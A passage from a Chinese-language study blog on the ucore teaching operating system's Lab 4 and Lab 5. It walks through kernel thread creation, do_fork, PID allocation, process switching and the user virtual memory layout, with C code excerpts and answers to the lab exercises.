<span class="hljs-title">trapframe</span> <span class="hljs-title">tf</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<br>    tf.tf_cs = KERNEL_CS;<br>    tf.tf_ds = tf_struct.tf_es = tf_struct.tf_ss = KERNEL_DS;<br>    tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)fn;<br>    tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>)arg;<br>    tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>    <span class="hljs-keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="hljs-number">0</span>, &amp;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>用局部变量在栈上保存trapframe, 全部设置成内核的段和栈</li><li>注意eip, 设置成了四行汇编的入口及退出代码, 效果相当于c语言main函数之前的准备函数</li><li>随后调用do_fork()进行线程的创建(主要根据trapframe)</li></ul></li><li><p>kern_thread中的do_fork()</p><ul><li><p>分配并初始化进程控制块（alloc_proc函数）</p></li><li><p>分配并初始化内核栈（setup_stack函数）,调用alloc_pages()分配2个(即<code>KSTACKPAGE</code>)page</p></li><li><p>根据clone_flag标志复制或共享进程内存管理结构（copy_mm函数）</p></li><li><p>设置进程在内核（将来也包括用户态）正常运行和调度所需的trapframe和执行context (<strong>copy_thread</strong>函数)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">copy_thread</span><span class="hljs-params">(struct proc_struct *proc, <span class="hljs-keyword">uintptr_t</span> esp, struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">//在内核堆栈的顶部设置中断帧大小的一块栈空间</span><br>    <span class="hljs-comment">//这个减一就很灵性, 因为tf在栈上占据了空间, 所以栈指针下移</span><br>    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="hljs-number">1</span>;<br>    *(proc-&gt;tf) = *tf; <span class="hljs-comment">//拷贝在kernel_thread函数建立的临时中断帧的初始值</span><br>    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="hljs-number">0</span>;<span class="hljs-comment">//设置子进程/线程执行完do_fork后的返回值</span><br>    proc-&gt;tf-&gt;tf_esp = esp; <span class="hljs-comment">//设置中断帧中的栈指针esp,因为我们复制了内存,直接使用父进程esp即可</span><br>    proc-&gt;tf-&gt;tf_eflags |= FL_IF; <span class="hljs-comment">//使能中断</span><br>    <br>    proc-&gt;context.eip = (<span class="hljs-keyword">uintptr_t</span>)forkret;<span class="hljs-comment">//由调度器中的switch_to把这个push到栈上再ret来恢复执行</span><br>    <span class="hljs-comment">//这个proc-&gt;tf和esp有什么关系? 其实fork执行完后子进程仍然处于内核中中断处理例程的状态(由context决定)</span><br>    <span class="hljs-comment">//如果父进程刚好有一个wait, 那么就会调度子进程执行, 也就是执行fork_ret从中断退出以继续执行用户进程</span><br>    proc-&gt;context.esp = (<span class="hljs-keyword">uintptr_t</span>)(proc-&gt;tf);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>把设置好的进程控制块放入hash_list和proc_list两个全局进程链表中</p></li><li><p>自此，进程已经准备好执行了，把进程状态设置为“就绪”态；</p></li><li><p>设置返回码为子进程的id号。</p></li><li><p>此时可知init_proc的中断帧如下所示, 控制块记录着该线程的一切必要信息, 在内核态设置好了内核栈以及其上的trapframe, 如果是用户程序(应该在下一个实验中)只需执行一下中断返回的流程即可</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//所在地址位置</span><br>initproc-&gt;tf= (proc-&gt;kstack+KSTACKSIZE) – <span class="hljs-keyword">sizeof</span> (struct trapframe);<br><span class="hljs-comment">//具体内容</span><br>initproc-&gt;tf.tf_cs = KERNEL_CS;<br>initproc-&gt;tf.tf_ds = initproc-&gt;tf.tf_es = initproc-&gt;tf.tf_ss = KERNEL_DS;<br>initproc-&gt;tf.tf_regs.reg_ebx = (<span class="hljs-keyword">uint32_t</span>)init_main;<br>initproc-&gt;tf.tf_regs.reg_edx = (<span class="hljs-keyword">uint32_t</span>) ADDRESS of <span class="hljs-string">&quot;Helloworld!!&quot;</span>;<br>initproc-&gt;tf.tf_eip = (<span class="hljs-keyword">uint32_t</span>)kernel_thread_entry;<br>initproc-&gt;tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;<br>initproc-&gt;tf.tf_esp = esp;<br>initproc-&gt;tf.tf_eflags |= FL_IF;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>然后从kern_init()中永真循环的cpu_idle进入调度函数<strong>schedule</strong>(), 是很简单的FIFO, 注意要保证调度操作的atomicity, 即屏蔽中断, IF置零</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// cpu_idle - at the end of kern_init, the first kernel thread idleproc will do below works</span><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cpu_idle</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>      <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>              schedule();<br>          &#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p><img src="../../image/ucore/image-20211224232536016.png" alt="image-20211224232536016"></p><ol><li>设置当前内核线程current-&gt;need_resched为0； <strong>(?</strong> </li><li>在proc_list队列中查找下一个处于“就绪”态的线程或进程<code>next</code>； </li><li>找到这样的进程后，就调用proc_run函数，保存当前进程current的执行现场（进程上下文），恢复新进程的执行现场，完成进程切换。</li></ol></li><li><p>proc_run比较重要:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">proc_run</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (proc != current) &#123;<br>        <span class="hljs-keyword">bool</span> intr_flag;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">prev</span> =</span> current, *next = proc;<br>        local_intr_save(intr_flag); <br>        &#123;<br>            current = proc;<br>            load_esp0(next-&gt;kstack + KSTACKSIZE);  <span class="hljs-comment">//在TSS中的ring0栈顶指针</span><br>            lcr3(next-&gt;cr3);<span class="hljs-comment">//这实际上是完成进程间的页表切换；</span><br>            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));<br>        &#125;<br>        local_intr_restore(intr_flag);<br>&#125;&#125;<br></code></pre></div></td></tr></table></figure><ul><li>switch()比较特别,因为两个参数都是在内存中,然而并不能从内存直接读取到内存, 只能通过一段汇编来把prev的context通过%eax做媒介存入相应寄存器中, 这样context就建立完成了, 注意到eip被设置成forkrets, 就是在trap.S里的一段汇编, 而且重用了以前的代码</li><li><strong>调度完成后先执行forkret, 从栈上弹出entry的地址(和ebp等一起包含在tf中), 然后再执行用户的主函数fn(在这里是initmain)</strong> </li></ul></li><li><p>随后<strong>进程执行完毕后</strong>就返回到kernel_tread_entry函数，并进一步调用<strong>do_exit</strong>执行退出操作了。本来do_exit应该完成一些资源回收工作等，但这些不是实验四涉及的，而是由后续的实验来完成。</p></li></ul><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-1"><a href="#练习1-1" class="headerlink" title="练习1"></a>练习1</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// alloc_proc - alloc a proc_struct and init all fields of proc_struct</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc_struct *</span><br><span class="hljs-function"><span class="hljs-title">alloc_proc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span> =</span> kmalloc(<span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>    <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(proc, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct proc_struct));<br>        proc-&gt;state = PROC_UNINIT;<br>        proc-&gt;pid = <span class="hljs-number">-1</span>;<br>        proc-&gt;cr3 = boot_cr3;<br>    &#125;<br>    <span class="hljs-keyword">return</span> proc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>请说明proc_struct中<code>struct context context</code>和<code>struct trapframe *tf</code>成员变量含义和在本实验中的作用是啥？</p><ul><li>context的含义很简单, 就是该线程的上下文即必要的控制流信息, 作用是在proc_run()函数中调用的switch(汇编label)保存当前执行的线程, 然后恢复next线程的context</li><li>tf一开始在kern_thread中作为局部变量存在栈上, 设置好从中断返回(通过iret)时的控制流后调用do_fork(), 在do_fork中的copy_thread复制tf到新线程, 至此完成任务</li></ul><h3 id="练习2-1"><a href="#练习2-1" class="headerlink" title="练习2"></a>练习2</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* do_fork -     parent process for a new child process</span><br><span class="hljs-comment"> * @clone_flags: used to guide how to clone the child process</span><br><span class="hljs-comment"> * @stack:       the parent&#x27;s user stack pointer. if stack==0, It means to fork a kernel thread.</span><br><span class="hljs-comment"> * @tf:          the trapframe info, which will be copied to child process&#x27;s proc-&gt;tf</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> clone_flags, <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span>, struct trapframe *tf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_NO_FREE_PROC;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">if</span> (nr_process &gt;= MAX_PROCESS)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    ret = -E_NO_MEM;<br>    <span class="hljs-comment">//    1. call alloc_proc to allocate a proc_struct</span><br>    <span class="hljs-comment">//    2. call setup_kstack to allocate a kernel stack for child process</span><br>    <span class="hljs-comment">//    3. call copy_mm to dup OR share mm according clone_flag</span><br>    <span class="hljs-comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span><br>    <span class="hljs-comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span><br>    <span class="hljs-comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span><br>    <span class="hljs-comment">//    7. set ret vaule using child proc&#x27;s pid</span><br>    <span class="hljs-keyword">if</span> ((proc = alloc_proc()) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;alloc_proc() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> fork_out;<br>    &#125;<br>    proc-&gt;parent = current;<br>    <span class="hljs-keyword">if</span> ((ret = setup_kstack(proc)) != <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//call the alloc_pages to alloc kstack space</span><br>        cprintf(<span class="hljs-string">&quot;set_kstack() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_proc;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (copy_mm(clone_flags, proc) != <span class="hljs-number">0</span>)<br>    &#123;<br>cprintf(<span class="hljs-string">&quot;copy_mm() failed!&quot;</span>);<br>        <span class="hljs-keyword">goto</span> bad_fork_cleanup_kstack;<br>    &#125;<br>    copy_thread(proc, <span class="hljs-built_in">stack</span>, tf);<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//原来这里还要加上屏蔽中断, 应该是操作当前proc_struct需要一起完成</span><br>     <span class="hljs-comment">//防止某个中断服务例程用到的时候出现错误</span><br>        proc-&gt;pid = get_pid();<br>        hash_proc(proc);<br>        list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>        nr_process++;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    wakeup_proc(proc);<br>    ret = proc-&gt;pid;<br>fork_out:<br>    <span class="hljs-keyword">return</span> ret;<br><br>bad_fork_cleanup_kstack:<br>    put_kstack(proc);<br>bad_fork_cleanup_proc:<br>    kfree(proc);<br>    <span class="hljs-keyword">goto</span> fork_out;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>请说明ucore是否做到给每个新fork的线程一个唯一的id？请说明你的分析和理由。</p><p>uCore中，每个新fork的线程都存在唯一的一个ID，理由如下：</p><ul><li><p>这一段代码相当于找出了一个初始为(MAX_PID,MAX_PID), 不满足条件时往pid大的方向查找的空闲区间(last_safe, next_safe),<br>只要<code>++last&lt;next</code>则自增后的last即为可分配的pid, 具体流程写进代码注释中</p></li><li><p>所以说通过维护一个可用PID的区间, 可以提高分配pid的效率</p></li><li><p><code>get_pid</code>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// get_pid - alloc a unique pid for process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">get_pid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">list_entry_t</span> *<span class="hljs-built_in">list</span> = &amp;proc_list, *le;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;<br>    <span class="hljs-keyword">if</span> (++last_pid &gt;= MAX_PID)<br>    &#123;<span class="hljs-comment">//last自增后&gt;=MAX_PID, 从1重新开始, next设为MAX_PID, 待后续缩小范围</span><br>        last_pid = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">goto</span> inside;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (last_pid &gt;= next_safe)<br>    &#123;<span class="hljs-comment">//last自增后&gt;=next, 当前空闲区间**已用完**, 继续向后查找</span><br>    inside:<br>        next_safe = MAX_PID;<br>    repeat:<span class="hljs-comment">//这段代码看半天, 终于看出来是在遍历proc_list, 如果pid==last, last就++</span><br>        <span class="hljs-comment">//如果pid在last和next之间, 则next=pid以缩小范围.</span><br>        <span class="hljs-comment">//特殊情况: ++last&gt;next,则重启while循环, 并且if(++last&gt;MAX_PID)则重置last为1</span><br>        le = <span class="hljs-built_in">list</span>;<br>        <span class="hljs-keyword">while</span> ((le = list_next(le)) != <span class="hljs-built_in">list</span>)<br>        &#123;<br>            proc = le2proc(le, list_link);<br>            <span class="hljs-keyword">if</span> (proc-&gt;pid == last_pid)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (++last_pid &gt;= next_safe)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (last_pid &gt;= MAX_PID)<br>                    &#123;<br>                        last_pid = <span class="hljs-number">1</span>;<br>                    &#125;<br>                    next_safe = MAX_PID;<br>                    <span class="hljs-keyword">goto</span> repeat;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid)<br>            &#123;<br>                next_safe = proc-&gt;pid;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> last_pid;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>理解proc_run</p></blockquote><p><strong>两个问题:</strong> </p><ul><li>在本实验的执行过程中，创建且运行了几个内核线程？<ul><li>两个</li></ul></li><li>语句<code>local_intr_save(intr_flag);....local_intr_restore(intr_flag);</code>在这里有何作用?请说明理由<ul><li>屏蔽中断</li><li>这两句的配合，使得这两句代码之间的代码块形成<strong>原子操作</strong>，可以使得某些关键的代码不会被打断，从而避免引起一些未预料到的错误，避免条件竞争。</li><li>以进程切换为例，在<code>proc_run</code>中，当刚设置好<code>current</code>指针为下一个进程，但还未完全将控制权转移时，如果该过程突然被一个中断所打断，则中断处理例程的执行可能会引发异常，因为<code>current</code>指针指向的进程与实际使用的进程资源不一致。</li></ul></li></ul><h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><blockquote><p>鸽!</p></blockquote><h1 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目结构"><a href="#0-项目结构" class="headerlink" title="0.项目结构"></a>0.项目结构</h3><p>相对与实验四，实验五主要改动如下：</p><p>◆ kern/debug/</p><p>kdebug.c：修改：解析用户进程的符号信息表示（可不用理会）</p><p>◆ kern/mm/ （与本次实验有较大关系）</p><p>memlayout.h：修改：增加了用户虚存地址空间的图形表示和宏定义 （需仔细理解）。</p><p>pmm.[ch]：修改：添加了用于进程退出（do_exit）的内存资源回收的page_remove_pte、unmap_range、exit_range函数和用于创建子进程（do_fork）中拷贝父进程内存空间的copy_range函数，修改了pgdir_alloc_page函数</p><p>vmm.[ch]：修改：扩展了mm_struct数据结构，增加了一系列函数</p><ul><li>mm_map/dup_mmap/exit_mmap：设定/取消/复制/删除用户进程的合法内存空间</li><li>copy_from_user/copy_to_user：用户内存空间内容与内核内存空间内容的相互拷贝的实现</li><li>user_mem_check：搜索vma链表，检查是否是一个合法的用户空间范围</li></ul><p>◆ kern/process/ （与本次实验有较大关系）</p><p>proc.[ch]：修改：扩展了proc_struct数据结构。增加或修改了一系列函数</p><ul><li>setup_pgdir/put_pgdir：创建并设置/释放页目录表</li><li>copy_mm：复制用户进程的内存空间和设置相关内存管理（如页表等）信息</li><li>do_exit：释放进程自身所占内存空间和相关内存管理（如页表等）信息所占空间，唤醒父进程，好让父进程收了自己，让调度器切换到其他进程</li><li>load_icode：被do_execve调用，完成加载放在内存中的执行程序到进程空间，这涉及到对页表等的修改，分配用户栈</li><li>do_execve：先回收自身所占用户空间，然后调用load_icode，用新的程序覆盖内存空间，形成一个执行新程序的新进程</li><li>do_yield：让调度器执行一次选择新进程的过程</li><li>do_wait：父进程等待子进程，并在得到子进程的退出消息后，彻底回收子进程所占的资源（比如子进程的内核栈和进程控制块）</li><li>do_kill：给一个进程设置PF_EXITING标志（“kill”信息，即要它死掉），这样在trap函数中，将根据此标志，让进程退出</li><li>KERNEL_EXECVE/__KERNEL_EXECVE/__KERNEL_EXECVE2：被user_main调用，执行一用户进程</li></ul><p>◆ kern/trap/</p><p>trap.c：修改：在idt_init函数中，对IDT初始化时，设置好了用于系统调用的中断门（idt[T_SYSCALL]）信息。这主要与syscall的实现相关</p><p>◆ user/*</p><p>新增的用户程序和用户库</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li>kern_init()-&gt;proc_init()-&gt;initproc-&gt;init_main()-&gt;kern_thread()-&gt;kernel_execve()</li><li>下图是虚拟内存的分布图, 注意page table固定在0xFAC00000的位置, 又给忘记了导致想了一会儿,<br>对于每个进程来说所看到的内存空间都是这样的.</li></ul> <figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G ------------------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                            |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            |    Remapped Physical Memory     | RW/-- KMEMSIZE</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     USERTOP -------------&gt; +---------------------------------+ 0xB0000000</span><br><span class="hljs-comment"> *                            |           User stack            |</span><br><span class="hljs-comment"> *                            +---------------------------------+</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |         ~~~~~~~~~~~~~~~~        |</span><br><span class="hljs-comment"> *                            :                                 :</span><br><span class="hljs-comment"> *                            |                                 |</span><br><span class="hljs-comment"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> *                            |       User Program &amp; Heap       |</span><br><span class="hljs-comment"> *     UTEXT ---------------&gt; +---------------------------------+ 0x00800000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *                            |  - - - - - - - - - - - - - - -  |</span><br><span class="hljs-comment"> *                            |    User STAB Data (optional)    |</span><br><span class="hljs-comment"> *     USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000</span><br><span class="hljs-comment"> *                            |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     0 -------------------&gt; +---------------------------------+ 0x00000000</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><h3 id="2-创建用户进程"><a href="#2-创建用户进程" class="headerlink" title="2.创建用户进程"></a>2.创建用户进程</h3><h4 id="a-应用程序的组成和编译"><a href="#a-应用程序的组成和编译" class="headerlink" title="a. 应用程序的组成和编译"></a>a. 应用程序的组成和编译</h4><p>从实验提供的用户程序编译入手, 可以看出hello应用程序不仅仅是hello.c，还包含了支持hello应用程序的用户态库：</p><ul><li>user/libs/initcode.S：所有应用程序的起始用户态执行地址“_start”，调整了EBP和ESP后，调用umain函数。</li><li>user/libs/umain.c：实现了umain函数，这是所有应用程序执行的第一个C函数，它将调用应用程序的main函数，并在main函数结束后调用exit函数，而exit函数最终将调用sys_exit系统调用，让操作系统回收进程资源。</li><li>user/libs/ulib.[ch]：实现了最小的C函数库，除了一些与系统调用无关的函数，其他函数是对访问系统调用的包装。</li><li>user/libs/syscall.[ch]：用户层发出系统调用的具体实现。</li><li>user/libs/stdio.c：实现cprintf函数，通过系统调用sys_putc来完成字符输出。</li><li>user/libs/panic.c：实现__panic/__warn函数，通过系统调用sys_exit完成用户进程退出。</li></ul><p>除了这些用户态库函数实现外，还有一些libs/*.[ch]是操作系统内核和应用程序共用的函数实现。<strong>这些用户库函数其实在本质上与UNIX系统中的标准libc没有区别</strong>，只是实现得很简单，但hello应用程序的正确执行离不开这些库函数。</p><p>在make的最后一步执行了一个ld命令，把hello应用程序的执行码obj/__user_hello.out连接在了ucore kernel的末尾。且ld命令会在kernel中会把__user_hello.out的位置和大小记录在全局变量_binary_obj___user_hello_out_start和_binary_obj___user_hello_out_size中，这样这个hello用户程序就能够和ucore内核一起被 bootloader 加载到内存里中，并且通过这两个全局变量定位hello用户程序执行码的起始位置和大小。而到了与文件系统相关的实验后，ucore会提供一个简单的文件系统，那时所有的用户程序就都不再用这种方法进行加载了，而可以用大家熟悉的文件方式进行加载了。</p><h4 id="b-用户进程的虚拟地址空间"><a href="#b-用户进程的虚拟地址空间" class="headerlink" title="b. 用户进程的虚拟地址空间"></a>b. 